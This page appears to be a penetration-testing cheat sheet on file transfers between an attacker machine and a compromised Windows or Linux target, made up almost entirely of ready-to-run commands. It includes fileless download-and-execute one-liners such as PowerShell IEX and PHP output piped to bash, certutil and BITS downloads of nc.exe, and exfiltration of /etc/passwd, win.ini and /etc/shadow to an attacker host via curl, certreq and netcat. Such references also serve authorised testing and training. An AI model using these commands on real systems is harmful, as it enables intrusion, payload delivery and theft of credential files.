---
layout: page
title: File Transfers
permalink: /cheatsheets/file-transfers/
---

## Serve Files (Attacker Side)

### Python HTTP server
```bash
python3 -m http.server 8000
python2 -m SimpleHTTPServer 8000
```

### impacket SMB server
```bash
# Anonymous
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With credentials
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### FTP server (pyftpdlib)
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

### Netcat listener (receive uploads)
```bash
sudo nc -lvnp 8000
```

---

## Windows — Download to Target

### PowerShell — DownloadFile
```powershell
(New-Object Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/file','C:\Users\Public\file')
(New-Object Net.WebClient).DownloadFileAsync('http://<LHOST>:<PORT>/file','C:\Users\Public\file')
```

### PowerShell — Fileless (execute in memory)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:<PORT>/script.ps1')
(New-Object Net.WebClient).DownloadString('http://<LHOST>:<PORT>/script.ps1') | IEX
```

### PowerShell — Invoke-WebRequest
```powershell
Invoke-WebRequest http://<LHOST>:<PORT>/file -OutFile C:\Users\Public\file
# If IE first-launch config blocks it:
Invoke-WebRequest http://<LHOST>:<PORT>/file -UseBasicParsing | IEX
```

### certutil
```powershell
certutil.exe -verifyctl -split -f http://<LHOST>:<PORT>/nc.exe
```

### BITSAdmin
```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<LHOST>:<PORT>/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### FTP via PowerShell (from attacker's pyftpdlib)
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<LHOST>/file.txt','C:\Users\Public\file.txt')
```

### Mount attacker SMB share
```cmd
net use n: \\<LHOST>\share /user:test test
copy n:\nc.exe C:\Windows\Temp\nc.exe
```

---

## Windows — Upload from Target

### certreq (exfiltrate via HTTP POST → catch with nc)
```cmd
certreq.exe -Post -config http://<LHOST>:8000/ c:\windows\win.ini
```
```bash
# Attacker
sudo nc -lvnp 8000
```

---

## Windows — Base64 Encode / Decode

### Encode file on Linux, transfer as text, decode on Windows
```bash
# Linux: encode
cat <FILE> | base64 -w 0; echo
```
```powershell
# Windows: decode and write
[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("<BASE64_STRING>"))
```

---

## Linux — Download to Target

### wget / curl
```bash
wget http://<LHOST>:<PORT>/file -O /tmp/file
curl http://<LHOST>:<PORT>/file -o /tmp/file
```

### Python 3
```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<LHOST>:<PORT>/file","file")'
```

### Python 2
```bash
python2.7 -c 'import urllib; urllib.urlretrieve("http://<LHOST>:<PORT>/file","file")'
```

### PHP
```bash
php -r '$file = file_get_contents("http://<LHOST>:<PORT>/file"); file_put_contents("file",$file);'
# Pipe directly to bash (fileless)
php -r '$lines = @file("http://<LHOST>:<PORT>/script.sh"); foreach ($lines as $line) { echo $line; }' | bash
```

### Ruby
```bash
ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("http://<LHOST>:<PORT>/file")))'
```

### Perl
```bash
perl -e 'use LWP::Simple; getstore("http://<LHOST>:<PORT>/file", "file");'
```

---

## Linux — Upload from Target

### curl POST (exfiltrate)
```bash
curl -X POST http://<LHOST>:<PORT>/ -F 'file=@/etc/passwd'
```

### Netcat
```bash
# Attacker
nc -lvnp 9001 > received_file

# Target
nc <LHOST> 9001 < /path/to/file
```

### Base64 over terminal
```bash
# Target: encode
base64 -w 0 /etc/shadow

# Attacker: paste output and decode
echo '<BASE64>' | base64 -d > shadow
```

---

## RDP — Share Local Folder

### xfreerdp
```bash
xfreerdp /v:<IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /drive:linux,/home/tr3m0x/share /cert:ignore
```

### rdesktop
```bash
rdesktop <IP> -d <DOMAIN> -u <USER> -p '<PASS>' -r disk:linux='/home/tr3m0x/share'
```

---

## Windows — JavaScript (cscript / wscript)

```javascript
// wget.js — run with: cscript wget.js <URL> <OUTFILE>
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
```cmd
cscript wget.js http://<LHOST>:<PORT>/nc.exe nc.exe
```
